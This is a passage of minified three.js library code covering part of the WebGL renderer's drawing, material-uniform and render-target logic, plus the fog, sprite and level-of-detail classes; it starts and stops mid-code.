e.copy(ee)},this.setScissor=function(e,t,i,n){e.isVector4?ee.set(e.x,e.y,e.z,e.w):ee.set(e,t,i,n),b.scissor(Y.copy(ee).multiplyScalar(J).floor())},this.getScissorTest=function(){return te},this.setScissorTest=function(e){b.setScissorTest(te=e)},this.getClearColor=function(){return L.getClearColor()},this.setClearColor=function(){L.setClearColor.apply(L,arguments)},this.getClearAlpha=function(){return L.getClearAlpha()},this.setClearAlpha=function(){L.setClearAlpha.apply(L,arguments)},this.clear=function(e,t,i){var n=0;(void 0===e||e)&&(n|=16384),(void 0===t||t)&&(n|=256),(void 0===i||i)&&(n|=1024),m.clear(n)},this.clearColor=function(){this.clear(!0,!1,!1)},this.clearDepth=function(){this.clear(!1,!0,!1)},this.clearStencil=function(){this.clear(!1,!1,!0)},this.dispose=function(){t.removeEventListener("webglcontextlost",fe,!1),t.removeEventListener("webglcontextrestored",me,!1),C.dispose(),P.dispose(),x.dispose(),E.dispose(),D.dispose(),ue.dispose(),be.stop()},this.renderBufferImmediate=function(e,t){D.initAttributes();var i=x.get(e);e.hasPositions&&!i.position&&(i.position=m.createBuffer()),e.hasNormals&&!i.normal&&(i.normal=m.createBuffer()),e.hasUvs&&!i.uv&&(i.uv=m.createBuffer()),e.hasColors&&!i.color&&(i.color=m.createBuffer());var n=t.getAttributes();e.hasPositions&&(m.bindBuffer(34962,i.position),m.bufferData(34962,e.positionArray,35048),D.enableAttribute(n.position),m.vertexAttribPointer(n.position,3,5126,!1,0,0)),e.hasNormals&&(m.bindBuffer(34962,i.normal),m.bufferData(34962,e.normalArray,35048),D.enableAttribute(n.normal),m.vertexAttribPointer(n.normal,3,5126,!1,0,0)),e.hasUvs&&(m.bindBuffer(34962,i.uv),m.bufferData(34962,e.uvArray,35048),D.enableAttribute(n.uv),m.vertexAttribPointer(n.uv,2,5126,!1,0,0)),e.hasColors&&(m.bindBuffer(34962,i.color),m.bufferData(34962,e.colorArray,35048),D.enableAttribute(n.color),m.vertexAttribPointer(n.color,3,5126,!1,0,0)),D.disableUnusedAttributes(),m.drawArrays(4,0,e.count),e.count=0},this.renderBufferDirect=function(e,t,i,n,r,o){var a=r.isMesh&&r.matrixWorld.determinant()<0;b.setMaterial(n,a);var s,c=Se(e,t,n,r),l=i.index,h=i.attributes.position,u=1;!0===n.wireframe&&(l=S.getWireframeAttribute(i),u=2),r.morphTargetInfluences&&R.update(r,i,n,c),D.setup(n,c,i,l);var d=k;null!==l&&(s=M.get(l),(d=O).setIndex(s));var p=1/0;null!==l?p=l.count:void 0!==h&&(p=h.count);var f=i.drawRange.start*u,m=i.drawRange.count*u,v=null!==o?o.start*u:0,g=null!==o?o.count*u:1/0,y=Math.max(f,v),w=Math.min(p,f+m,v+g)-1,x=Math.max(0,w-y+1);if(0!==x){if(r.isMesh)if(!0===n.wireframe)b.setLineWidth(n.wireframeLinewidth*ce()),d.setMode(1);else switch(r.drawMode){case 0:d.setMode(4);break;case 1:d.setMode(5);break;case 2:d.setMode(6)}else if(r.isLine){var _=n.linewidth;void 0===_&&(_=1),b.setLineWidth(_*ce()),r.isLineSegments?d.setMode(1):r.isLineLoop?d.setMode(2):d.setMode(3)}else r.isPoints?d.setMode(0):r.isSprite&&d.setMode(4);r.isInstancedMesh?d.renderInstances(i,y,x,r.count):i.isInstancedBufferGeometry?d.renderInstances(i,y,x,i.maxInstancedCount):d.render(y,x)}},this.compile=function(e,t){(d=P.get(e,t)).init(),e.traverse((function(e){e.isLight&&(d.pushLight(e),e.castShadow&&d.pushShadow(e))})),d.setupLights(t),e.traverse((function(t){if(t.material)if(Array.isArray(t.material))for(var i=0;i<t.material.length;i++)Me(t.material[i],e.fog,t);else Me(t.material,e.fog,t)}))};var ye=null;var be=new ri;function we(e,t,i,n){if(!1!==e.visible){if(e.layers.test(t.layers))if(e.isGroup)i=e.renderOrder;else if(e.isLOD)!0===e.autoUpdate&&e.update(t);else if(e.isLight)d.pushLight(e),e.castShadow&&d.pushShadow(e);else if(e.isSprite){if(!e.frustumCulled||ie.intersectsSprite(e)){n&&se.setFromMatrixPosition(e.matrixWorld).applyMatrix4(ae);var r=E.update(e);(o=e.material).visible&&u.push(e,r,o,i,se.z,null)}}else if(e.isImmediateRenderObject)n&&se.setFromMatrixPosition(e.matrixWorld).applyMatrix4(ae),u.push(e,null,e.material,i,se.z,null);else if((e.isMesh||e.isLine||e.isPoints)&&(e.isSkinnedMesh&&e.skeleton.frame!==w.render.frame&&(e.skeleton.update(),e.skeleton.frame=w.render.frame),!e.frustumCulled||ie.intersectsObject(e))){n&&se.setFromMatrixPosition(e.matrixWorld).applyMatrix4(ae);r=E.update(e);var o=e.material;if(Array.isArray(o))for(var a=r.groups,s=0,c=a.length;s<c;s++){var l=a[s],h=o[l.materialIndex];h&&h.visible&&u.push(e,r,h,i,se.z,l)}else o.visible&&u.push(e,r,o,i,se.z,null)}var p=e.children;for(s=0,c=p.length;s<c;s++)we(p[s],t,i,n)}}function xe(e,t,i,n){for(var r=0,o=e.length;r<o;r++){var a=e[r],s=a.object,c=a.geometry,l=void 0===n?a.material:n,h=a.group;if(i.isArrayCamera)if(q=i,ue.enabled&&de.isAvailable())_e(s,t,i,c,l,h);else for(var u=i.cameras,p=0,f=u.length;p<f;p++){var m=u[p];s.layers.test(m.layers)&&(b.viewport(X.copy(m.viewport)),d.setupLights(m),_e(s,t,m,c,l,h))}else q=null,_e(s,t,i,c,l,h)}}function _e(e,t,i,n,r,o){if(e.onBeforeRender(z,t,i,n,r,o),d=P.get(t,q||i),e.modelViewMatrix.multiplyMatrices(i.matrixWorldInverse,e.matrixWorld),e.normalMatrix.getNormalMatrix(e.modelViewMatrix),e.isImmediateRenderObject){b.setMaterial(r);var a=Se(i,t.fog,r,e);D.reset(),function(e,t){e.render((function(e){z.renderBufferImmediate(e,t)}))}(e,a)}else z.renderBufferDirect(i,t.fog,n,r,e,o);e.onAfterRender(z,t,i,n,r,o),d=P.get(t,q||i)}function Me(e,t,i){var n=x.get(e),r=d.state.lights,o=d.state.shadowsArray,a=r.state.version,s=A.getParameters(e,r.state,o,t,ne.numPlanes,ne.numIntersection,i),c=A.getProgramCode(e,s),l=n.program,h=!0;if(void 0===l)e.addEventListener("dispose",ve);else if(l.code!==c)ge(e);else if(n.lightsStateVersion!==a)n.lightsStateVersion=a,h=!1;else{if(void 0!==s.shaderID)return;h=!1}if(h){if(s.shaderID){var u=ni[s.shaderID];n.shader={name:e.type,uniforms:Nt(u.uniforms),vertexShader:u.vertexShader,fragmentShader:u.fragmentShader}}else n.shader={name:e.type,uniforms:e.uniforms,vertexShader:e.vertexShader,fragmentShader:e.fragmentShader};e.onBeforeCompile(n.shader,z),c=A.getProgramCode(e,s),l=A.acquireProgram(e,n.shader,s,c),n.program=l,e.program=l}var p=l.getAttributes();if(e.morphTargets){e.numSupportedMorphTargets=0;for(var f=0;f<z.maxMorphTargets;f++)p["morphTarget"+f]>=0&&e.numSupportedMorphTargets++}if(e.morphNormals){e.numSupportedMorphNormals=0;for(f=0;f<z.maxMorphNormals;f++)p["morphNormal"+f]>=0&&e.numSupportedMorphNormals++}var m=n.shader.uniforms;(e.isShaderMaterial||e.isRawShaderMaterial)&&!0!==e.clipping||(n.numClippingPlanes=ne.numPlanes,n.numIntersection=ne.numIntersection,m.clippingPlanes=ne.uniform),n.fog=t,n.needsLights=function(e){return e.isMeshLambertMaterial||e.isMeshPhongMaterial||e.isMeshStandardMaterial||e.isShadowMaterial||e.isShaderMaterial&&!0===e.lights}(e),n.lightsStateVersion=a,n.needsLights&&(m.ambientLightColor.value=r.state.ambient,m.lightProbe.value=r.state.probe,m.directionalLights.value=r.state.directional,m.spotLights.value=r.state.spot,m.rectAreaLights.value=r.state.rectArea,m.pointLights.value=r.state.point,m.hemisphereLights.value=r.state.hemi,m.directionalShadowMap.value=r.state.directionalShadowMap,m.directionalShadowMatrix.value=r.state.directionalShadowMatrix,m.spotShadowMap.value=r.state.spotShadowMap,m.spotShadowMatrix.value=r.state.spotShadowMatrix,m.pointShadowMap.value=r.state.pointShadowMap,m.pointShadowMatrix.value=r.state.pointShadowMatrix);var v=n.program.getUniforms(),g=yn.seqWithValue(v.seq,m);n.uniformsList=g}function Se(e,t,i,n){_.resetTextureUnits();var r=x.get(i),o=d.state.lights;if(re&&(oe||e!==W)){var a=e===W&&i.id===G;ne.setState(i.clippingPlanes,i.clipIntersection,i.clipShadows,e,r,a)}!1===i.needsUpdate&&(void 0===r.program?i.needsUpdate=!0:i.fog&&r.fog!==t?i.needsUpdate=!0:r.needsLights&&r.lightsStateVersion!==o.state.version?i.needsUpdate=!0:void 0===r.numClippingPlanes||r.numClippingPlanes===ne.numPlanes&&r.numIntersection===ne.numIntersection||(i.needsUpdate=!0)),i.needsUpdate&&(Me(i,t,n),i.needsUpdate=!1);var s,c,l=!1,h=!1,u=!1,f=r.program,v=f.getUniforms(),y=r.shader.uniforms;if(b.useProgram(f.program)&&(l=!0,h=!0,u=!0),i.id!==G&&(G=i.id,h=!0),l||W!==e){if(f.numMultiviewViews>0?de.updateCameraProjectionMatricesUniform(e,v):v.setValue(m,"projectionMatrix",e.projectionMatrix),g.logarithmicDepthBuffer&&v.setValue(m,"logDepthBufFC",2/(Math.log(e.far+1)/Math.LN2)),W!==e&&(W=e,h=!0,u=!0),i.isShaderMaterial||i.isMeshPhongMaterial||i.isMeshStandardMaterial||i.envMap){var w=v.map.cameraPosition;void 0!==w&&w.setValue(m,se.setFromMatrixPosition(e.matrixWorld))}(i.isMeshPhongMaterial||i.isMeshLambertMaterial||i.isMeshBasicMaterial||i.isMeshStandardMaterial||i.isShaderMaterial||i.skinning)&&(f.numMultiviewViews>0?de.updateCameraViewMatricesUniform(e,v):v.setValue(m,"viewMatrix",e.matrixWorldInverse))}if(i.skinning){v.setOptional(m,n,"bindMatrix"),v.setOptional(m,n,"bindMatrixInverse");var M=n.skeleton;if(M){var S=M.bones;if(g.floatVertexTextures){if(void 0===M.boneTexture){var T=Math.sqrt(4*S.length);T=p.ceilPowerOfTwo(T),T=Math.max(T,4);var E=new Float32Array(T*T*4);E.set(M.boneMatrices);var A=new Xt(E,T,T,1023,1015);M.boneMatrices=E,M.boneTexture=A,M.boneTextureSize=T}v.setValue(m,"boneTexture",M.boneTexture,_),v.setValue(m,"boneTextureSize",M.boneTextureSize)}else v.setOptional(m,M,"boneMatrices")}}return(h||r.receiveShadow!==n.receiveShadow)&&(r.receiveShadow=n.receiveShadow,v.setValue(m,"receiveShadow",n.receiveShadow)),h&&(v.setValue(m,"toneMappingExposure",z.toneMappingExposure),v.setValue(m,"toneMappingWhitePoint",z.toneMappingWhitePoint),r.needsLights&&(c=u,(s=y).ambientLightColor.needsUpdate=c,s.lightProbe.needsUpdate=c,s.directionalLights.needsUpdate=c,s.pointLights.needsUpdate=c,s.spotLights.needsUpdate=c,s.rectAreaLights.needsUpdate=c,s.hemisphereLights.needsUpdate=c),t&&i.fog&&function(e,t){e.fogColor.value.copy(t.color),t.isFog?(e.fogNear.value=t.near,e.fogFar.value=t.far):t.isFogExp2&&(e.fogDensity.value=t.density)}(y,t),i.isMeshBasicMaterial?Te(y,i):i.isMeshLambertMaterial?(Te(y,i),function(e,t){t.emissiveMap&&(e.emissiveMap.value=t.emissiveMap)}(y,i)):i.isMeshPhongMaterial?(Te(y,i),i.isMeshToonMaterial?function(e,t){Ee(e,t),t.gradientMap&&(e.gradientMap.value=t.gradientMap)}(y,i):Ee(y,i)):i.isMeshStandardMaterial?(Te(y,i),i.isMeshPhysicalMaterial?function(e,t){Ae(e,t),e.reflectivity.value=t.reflectivity,e.clearcoat.value=t.clearcoat,e.clearcoatRoughness.value=t.clearcoatRoughness,t.sheen&&e.sheen.value.copy(t.sheen);t.clearcoatNormalMap&&(e.clearcoatNormalScale.value.copy(t.clearcoatNormalScale),e.clearcoatNormalMap.value=t.clearcoatNormalMap,1===t.side&&e.clearcoatNormalScale.value.negate());e.transparency.value=t.transparency}(y,i):Ae(y,i)):i.isMeshMatcapMaterial?(Te(y,i),function(e,t){t.matcap&&(e.matcap.value=t.matcap);t.bumpMap&&(e.bumpMap.value=t.bumpMap,e.bumpScale.value=t.bumpScale,1===t.side&&(e.bumpScale.value*=-1));t.normalMap&&(e.normalMap.value=t.normalMap,e.normalScale.value.copy(t.normalScale),1===t.side&&e.normalScale.value.negate());t.displacementMap&&(e.displacementMap.value=t.displacementMap,e.displacementScale.value=t.displacementScale,e.displacementBias.value=t.displacementBias)}(y,i)):i.isMeshDepthMaterial?(Te(y,i),function(e,t){t.displacementMap&&(e.displacementMap.value=t.displacementMap,e.displacementScale.value=t.displacementScale,e.displacementBias.value=t.displacementBias)}(y,i)):i.isMeshDistanceMaterial?(Te(y,i),function(e,t){t.displacementMap&&(e.displacementMap.value=t.displacementMap,e.displacementScale.value=t.displacementScale,e.displacementBias.value=t.displacementBias);e.referencePosition.value.copy(t.referencePosition),e.nearDistance.value=t.nearDistance,e.farDistance.value=t.farDistance}(y,i)):i.isMeshNormalMaterial?(Te(y,i),function(e,t){t.bumpMap&&(e.bumpMap.value=t.bumpMap,e.bumpScale.value=t.bumpScale,1===t.side&&(e.bumpScale.value*=-1));t.normalMap&&(e.normalMap.value=t.normalMap,e.normalScale.value.copy(t.normalScale),1===t.side&&e.normalScale.value.negate());t.displacementMap&&(e.displacementMap.value=t.displacementMap,e.displacementScale.value=t.displacementScale,e.displacementBias.value=t.displacementBias)}(y,i)):i.isLineBasicMaterial?(function(e,t){e.diffuse.value.copy(t.color),e.opacity.value=t.opacity}(y,i),i.isLineDashedMaterial&&function(e,t){e.dashSize.value=t.dashSize,e.totalSize.value=t.dashSize+t.gapSize,e.scale.value=t.scale}(y,i)):i.isPointsMaterial?function(e,t){e.diffuse.value.copy(t.color),e.opacity.value=t.opacity,e.size.value=t.size*J,e.scale.value=.5*$,t.map&&(e.map.value=t.map);t.alphaMap&&(e.alphaMap.value=t.alphaMap);var i;t.map?i=t.map:t.alphaMap&&(i=t.alphaMap);void 0!==i&&(!0===i.matrixAutoUpdate&&i.updateMatrix(),e.uvTransform.value.copy(i.matrix))}(y,i):i.isSpriteMaterial?function(e,t){e.diffuse.value.copy(t.color),e.opacity.value=t.opacity,e.rotation.value=t.rotation,t.map&&(e.map.value=t.map);t.alphaMap&&(e.alphaMap.value=t.alphaMap);var i;t.map?i=t.map:t.alphaMap&&(i=t.alphaMap);void 0!==i&&(!0===i.matrixAutoUpdate&&i.updateMatrix(),e.uvTransform.value.copy(i.matrix))}(y,i):i.isShadowMaterial&&(y.color.value.copy(i.color),y.opacity.value=i.opacity),void 0!==y.ltc_1&&(y.ltc_1.value=ii.LTC_1),void 0!==y.ltc_2&&(y.ltc_2.value=ii.LTC_2),yn.upload(m,r.uniformsList,y,_),i.isShaderMaterial&&(i.uniformsNeedUpdate=!1)),i.isShaderMaterial&&!0===i.uniformsNeedUpdate&&(yn.upload(m,r.uniformsList,y,_),i.uniformsNeedUpdate=!1),i.isSpriteMaterial&&v.setValue(m,"center",n.center),f.numMultiviewViews>0?de.updateObjectMatricesUniforms(n,e,v):(v.setValue(m,"modelViewMatrix",n.modelViewMatrix),v.setValue(m,"normalMatrix",n.normalMatrix)),v.setValue(m,"modelMatrix",n.matrixWorld),f}function Te(e,t){var i;e.opacity.value=t.opacity,t.color&&e.diffuse.value.copy(t.color),t.emissive&&e.emissive.value.copy(t.emissive).multiplyScalar(t.emissiveIntensity),t.map&&(e.map.value=t.map),t.alphaMap&&(e.alphaMap.value=t.alphaMap),t.specularMap&&(e.specularMap.value=t.specularMap),t.envMap&&(e.envMap.value=t.envMap,e.flipEnvMap.value=t.envMap.isCubeTexture?-1:1,e.reflectivity.value=t.reflectivity,e.refractionRatio.value=t.refractionRatio,e.maxMipLevel.value=x.get(t.envMap).__maxMipLevel),t.lightMap&&(e.lightMap.value=t.lightMap,e.lightMapIntensity.value=t.lightMapIntensity),t.aoMap&&(e.aoMap.value=t.aoMap,e.aoMapIntensity.value=t.aoMapIntensity),t.map?i=t.map:t.specularMap?i=t.specularMap:t.displacementMap?i=t.displacementMap:t.normalMap?i=t.normalMap:t.bumpMap?i=t.bumpMap:t.roughnessMap?i=t.roughnessMap:t.metalnessMap?i=t.metalnessMap:t.alphaMap?i=t.alphaMap:t.emissiveMap&&(i=t.emissiveMap),void 0!==i&&(i.isWebGLRenderTarget&&(i=i.texture),!0===i.matrixAutoUpdate&&i.updateMatrix(),e.uvTransform.value.copy(i.matrix))}function Ee(e,t){e.specular.value.copy(t.specular),e.shininess.value=Math.max(t.shininess,1e-4),t.emissiveMap&&(e.emissiveMap.value=t.emissiveMap),t.bumpMap&&(e.bumpMap.value=t.bumpMap,e.bumpScale.value=t.bumpScale,1===t.side&&(e.bumpScale.value*=-1)),t.normalMap&&(e.normalMap.value=t.normalMap,e.normalScale.value.copy(t.normalScale),1===t.side&&e.normalScale.value.negate()),t.displacementMap&&(e.displacementMap.value=t.displacementMap,e.displacementScale.value=t.displacementScale,e.displacementBias.value=t.displacementBias)}function Ae(e,t){e.roughness.value=t.roughness,e.metalness.value=t.metalness,t.roughnessMap&&(e.roughnessMap.value=t.roughnessMap),t.metalnessMap&&(e.metalnessMap.value=t.metalnessMap),t.emissiveMap&&(e.emissiveMap.value=t.emissiveMap),t.bumpMap&&(e.bumpMap.value=t.bumpMap,e.bumpScale.value=t.bumpScale,1===t.side&&(e.bumpScale.value*=-1)),t.normalMap&&(e.normalMap.value=t.normalMap,e.normalScale.value.copy(t.normalScale),1===t.side&&e.normalScale.value.negate()),t.displacementMap&&(e.displacementMap.value=t.displacementMap,e.displacementScale.value=t.displacementScale,e.displacementBias.value=t.displacementBias),t.envMap&&(e.envMapIntensity.value=t.envMapIntensity)}be.setAnimationLoop((function(e){ue.isPresenting()||ye&&ye(e)})),"undefined"!=typeof window&&be.setContext(window),this.setAnimationLoop=function(e){ye=e,ue.setAnimationLoop(e),be.start()},this.render=function(e,t){var i,n;if(void 0!==arguments[2]&&(console.warn("THREE.WebGLRenderer.render(): the renderTarget argument has been removed. Use .setRenderTarget() instead."),i=arguments[2]),void 0!==arguments[3]&&(console.warn("THREE.WebGLRenderer.render(): the forceClear argument has been removed. Use .clear() instead."),n=arguments[3]),t&&t.isCamera){if(!F){D.resetDefaultState(),G=-1,W=null,!0===e.autoUpdate&&e.updateMatrixWorld(),null===t.parent&&t.updateMatrixWorld(),ue.enabled&&(t=ue.getCamera(t)),(d=P.get(e,t)).init(),e.onBeforeRender(z,e,t,i||V),ae.multiplyMatrices(t.projectionMatrix,t.matrixWorldInverse),ie.setFromMatrix(ae),oe=this.localClippingEnabled,re=ne.init(this.clippingPlanes,oe,t),(u=C.get(e,t)).init(),we(e,t,0,z.sortObjects),!0===z.sortObjects&&u.sort(),re&&ne.beginShadows();var r=d.state.shadowsArray;pe.render(r,e,t),d.setupLights(t),re&&ne.endShadows(),this.info.autoReset&&this.info.reset(),void 0!==i&&this.setRenderTarget(i),ue.enabled&&de.isAvailable()&&de.attachCamera(t),L.render(u,e,t,n);var o=u.opaque,a=u.transparent;if(e.overrideMaterial){var s=e.overrideMaterial;o.length&&xe(o,e,t,s),a.length&&xe(a,e,t,s)}else o.length&&xe(o,e,t),a.length&&xe(a,e,t);e.onAfterRender(z,e,t),null!==V&&(_.updateRenderTargetMipmap(V),_.updateMultisampleRenderTarget(V)),b.buffers.depth.setTest(!0),b.buffers.depth.setMask(!0),b.buffers.color.setMask(!0),b.setPolygonOffset(!1),ue.enabled&&(de.isAvailable()&&de.detachCamera(t),ue.submitFrame()),u=null,d=null}}else console.error("THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.")},this.setFramebuffer=function(e){N!==e&&null===V&&m.bindFramebuffer(36160,e),N=e},this.getActiveCubeFace=function(){return j},this.getActiveMipmapLevel=function(){return U},this.getRenderTarget=function(){return V},this.setRenderTarget=function(e,t,i){V=e,j=t,U=i,e&&void 0===x.get(e).__webglFramebuffer&&_.setupRenderTarget(e);var n=N,r=!1;if(e){var o=x.get(e).__webglFramebuffer;e.isWebGLRenderTargetCube?(n=o[t||0],r=!0):n=e.isWebGLMultisampleRenderTarget?x.get(e).__webglMultisampledFramebuffer:o,X.copy(e.viewport),Y.copy(e.scissor),Z=e.scissorTest}else X.copy(K).multiplyScalar(J).floor(),Y.copy(ee).multiplyScalar(J).floor(),Z=te;if(H!==n&&(m.bindFramebuffer(36160,n),H=n),b.viewport(X),b.scissor(Y),b.setScissorTest(Z),r){var a=x.get(e.texture);m.framebufferTexture2D(36160,36064,34069+(t||0),a.__webglTexture,i||0)}},this.readRenderTargetPixels=function(e,t,i,n,r,o,a){if(e&&e.isWebGLRenderTarget){var s=x.get(e).__webglFramebuffer;if(e.isWebGLRenderTargetCube&&void 0!==a&&(s=s[a]),s){var c=!1;s!==H&&(m.bindFramebuffer(36160,s),c=!0);try{var l=e.texture,h=l.format,u=l.type;if(1023!==h&&I.convert(h)!==m.getParameter(35739))return void console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.");if(!(1009===u||I.convert(u)===m.getParameter(35738)||1015===u&&(g.isWebGL2||v.get("OES_texture_float")||v.get("WEBGL_color_buffer_float"))||1016===u&&(g.isWebGL2?v.get("EXT_color_buffer_float"):v.get("EXT_color_buffer_half_float"))))return void console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.");36053===m.checkFramebufferStatus(36160)?t>=0&&t<=e.width-n&&i>=0&&i<=e.height-r&&m.readPixels(t,i,n,r,I.convert(h),I.convert(u),o):console.error("THREE.WebGLRenderer.readRenderTargetPixels: readPixels from renderTarget failed. Framebuffer not complete.")}finally{c&&m.bindFramebuffer(36160,H)}}}else console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.")},this.copyFramebufferToTexture=function(e,t,i){var n=t.image.width,r=t.image.height,o=I.convert(t.format);_.setTexture2D(t,0),m.copyTexImage2D(3553,i||0,o,e.x,e.y,n,r,0)},this.copyTextureToTexture=function(e,t,i,n){var r=t.image.width,o=t.image.height,a=I.convert(i.format),s=I.convert(i.type);_.setTexture2D(i,0),t.isDataTexture?m.texSubImage2D(3553,n||0,e.x,e.y,r,o,a,s,t.image.data):m.texSubImage2D(3553,n||0,e.x,e.y,a,s,t.image)},"undefined"!=typeof __THREE_DEVTOOLS__&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}function ur(e,t){this.name="",this.color=new Ne(e),this.density=void 0!==t?t:25e-5}function dr(e,t,i){this.name="",this.color=new Ne(e),this.near=void 0!==t?t:1,this.far=void 0!==i?i:1e3}function pr(e,t){this._array=e,this._stride=t,this.count=void 0!==e?e.length/t:0,this.usage=35044,this.updateRange={offset:0,count:-1},this.version=0,this.versionVAO=0}function fr(e,t,i,n){this._data=e,this._itemSize=t,this._offset=i,this._normalized=!0===n,this.versionVAO=0}function mr(e){We.call(this),this.type="SpriteMaterial",this.color=new Ne(16777215),this.map=null,this.alphaMap=null,this.rotation=0,this.sizeAttenuation=!0,this.transparent=!0,this.setValues(e)}Object.assign(cr.prototype,h.prototype),Object.assign(lr.prototype,h.prototype),Object.assign(ur.prototype,{isFogExp2:!0,clone:function(){return new ur(this.color,this.density)},toJSON:function(){return{type:"FogExp2",color:this.color.getHex(),density:this.density}}}),Object.assign(dr.prototype,{isFog:!0,clone:function(){return new dr(this.color,this.near,this.far)},toJSON:function(){return{type:"Fog",color:this.color.getHex(),near:this.near,far:this.far}}}),Object.defineProperties(pr.prototype,{needsUpdate:{set:function(e){!0===e&&this.version++}},array:{get:function(){return this._array},set:function(e){this._array=e,this.versionVAO++}},stride:{get:function(){return this._stride},set:function(e){this._stride=e,this.versionVAO++}}}),Object.assign(pr.prototype,{isInterleavedBuffer:!0,onUploadCallback:function(){},setUsage:function(e){return this.usage=e,this},copy:function(e){return this.array=new e.array.constructor(e.array),this.count=e.count,this.stride=e.stride,this.usage=e.usage,this},copyAt:function(e,t,i){e*=this.stride,i*=t.stride;for(var n=0,r=this.stride;n<r;n++)this.array[e+n]=t.array[i+n];return this},set:function(e,t){return void 0===t&&(t=0),this.array.set(e,t),this},clone:function(){return(new this.constructor).copy(this)},onUpload:function(e){return this.onUploadCallback=e,this}}),Object.defineProperties(fr.prototype,{count:{get:function(){return this.data.count}},array:{get:function(){return this.data.array}},data:{get:function(){return this._data},set:function(e){this._data=e,this.versionVAO++}},itemSize:{get:function(){return this._itemSize},set:function(e){this._itemSize=e,this.versionVAO++}},offset:{get:function(){return this._offset},set:function(e){this._offset=e,this.versionVAO++}},normalized:{get:function(){return this._normalized},set:function(e){this._normalized=e,this.versionVAO++}}}),Object.assign(fr.prototype,{isInterleavedBufferAttribute:!0,setX:function(e,t){return this.data.array[e*this.data.stride+this.offset]=t,this},setY:function(e,t){return this.data.array[e*this.data.stride+this.offset+1]=t,this},setZ:function(e,t){return this.data.array[e*this.data.stride+this.offset+2]=t,this},setW:function(e,t){return this.data.array[e*this.data.stride+this.offset+3]=t,this},getX:function(e){return this.data.array[e*this.data.stride+this.offset]},getY:function(e){return this.data.array[e*this.data.stride+this.offset+1]},getZ:function(e){return this.data.array[e*this.data.stride+this.offset+2]},getW:function(e){return this.data.array[e*this.data.stride+this.offset+3]},setXY:function(e,t,i){return e=e*this.data.stride+this.offset,this.data.array[e+0]=t,this.data.array[e+1]=i,this},setXYZ:function(e,t,i,n){return e=e*this.data.stride+this.offset,this.data.array[e+0]=t,this.data.array[e+1]=i,this.data.array[e+2]=n,this},setXYZW:function(e,t,i,n,r){return e=e*this.data.stride+this.offset,this.data.array[e+0]=t,this.data.array[e+1]=i,this.data.array[e+2]=n,this.data.array[e+3]=r,this}}),mr.prototype=Object.create(We.prototype),mr.prototype.constructor=mr,mr.prototype.isSpriteMaterial=!0,mr.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.color.copy(e.color),this.map=e.map,this.alphaMap=e.alphaMap,this.rotation=e.rotation,this.sizeAttenuation=e.sizeAttenuation,this};var vr=new y,gr=new y,yr=new y,br=new f,wr=new f,xr=new B,_r=new y,Mr=new y,Sr=new y,Tr=new f,Er=new f,Ar=new f;function Cr(e){if(K.call(this),this.type="Sprite",void 0===rr){rr=new dt;var t=new pr(new Float32Array([-.5,-.5,0,0,0,.5,-.5,0,1,0,.5,.5,0,1,1,-.5,.5,0,0,1]),5);rr.setIndex([0,1,2,0,2,3]),rr.addAttribute("position",new fr(t,3,0,!1)),rr.addAttribute("uv",new fr(t,2,3,!1))}this.geometry=rr,this.material=void 0!==e?e:new mr,this.center=new f(.5,.5)}function Pr(e,t,i,n,r,o){br.subVectors(e,i).addScalar(.5).multiply(n),void 0!==r?(wr.x=o*br.x-r*br.y,wr.y=r*br.x+o*br.y):wr.copy(br),e.copy(t),e.x+=wr.x,e.y+=wr.y,e.applyMatrix4(xr)}Cr.prototype=Object.assign(Object.create(K.prototype),{constructor:Cr,isSprite:!0,raycast:function(e,t){null===e.camera&&console.error('THREE.Sprite: "Raycaster.camera" needs to be set in order to raycast against sprites.'),gr.setFromMatrixScale(this.matrixWorld),xr.copy(e.camera.matrixWorld),this.modelViewMatrix.multiplyMatrices(e.camera.matrixWorldInverse,this.matrixWorld),yr.setFromMatrixPosition(this.modelViewMatrix),e.camera.isPerspectiveCamera&&!1===this.material.sizeAttenuation&&gr.multiplyScalar(-yr.z);var i,n,r=this.material.rotation;0!==r&&(n=Math.cos(r),i=Math.sin(r));var o=this.center;Pr(_r.set(-.5,-.5,0),yr,o,gr,i,n),Pr(Mr.set(.5,-.5,0),yr,o,gr,i,n),Pr(Sr.set(.5,.5,0),yr,o,gr,i,n),Tr.set(0,0),Er.set(1,0),Ar.set(1,1);var a=e.ray.intersectTriangle(_r,Mr,Sr,!1,vr);if(null!==a||(Pr(Mr.set(-.5,.5,0),yr,o,gr,i,n),Er.set(0,1),null!==(a=e.ray.intersectTriangle(_r,Sr,Mr,!1,vr)))){var s=e.ray.origin.distanceTo(vr);s<e.near||s>e.far||t.push({distance:s,point:vr.clone(),uv:Be.getUV(vr,_r,Mr,Sr,Tr,Er,Ar,new f),face:null,object:this})}},clone:function(){return new this.constructor(this.material).copy(this)},copy:function(e){return K.prototype.copy.call(this,e),void 0!==e.center&&this.center.copy(e.center),this}});var Lr=new y,Rr=new y;function kr(){K.call(this),this.type="LOD",Object.defineProperties(this,{levels:{enumerable:!0,value:[]}}),this.autoUpdate=!0}function Or(e,t){e&&e.isGeometry&&console.error("THREE.SkinnedMesh no longer supports THREE.Geometry. Use THREE.BufferGeometry instead."),Lt.call(this,e,t),this.type="SkinnedMesh",this.bindMode="attached",this.bindMatrix=new B,this.bindMatrixInverse=new B}kr.prototype=Object.assign(Object.create(K.prototype),{constructor:kr,isLOD:!0,copy:function(e){K.prototype.copy.call(this,e,!1);for(var t=e.levels,i=0,n=t.length;i<n;i++){var r=t[i];this.addLevel(r.object.clone(),r.distance)}return this},addLevel:function(e,t){void 0===t&&(t=0),t=Math.abs(t);for(var i=this.levels,n=0;n<i.length&&!(t<i[n].distance);n++);return i.splice(n,0,{distance:t,object:e}),this.add(e),this},getObjectForDistance:function(e){for(var t=this.levels,i=1,n=t.length;i<n&&!(e<t[i].distance);i++);return t[i-1].object},raycast:function(e,t){Lr.setFromMatrixPosition(this.matrixWorld);var i=e.ray.origin.distanceTo(Lr);this.getObjectForDistance(i).raycast(e,t)},update:function(e){var t=this.levels;if(t.length>1){Lr.setFromMatrixPosition(e.matrixWorld),Rr.setFromMatrixPosition(this.matrixWorld);var i=Lr.distanceTo(Rr);t[0].object.visible=!0;for(var 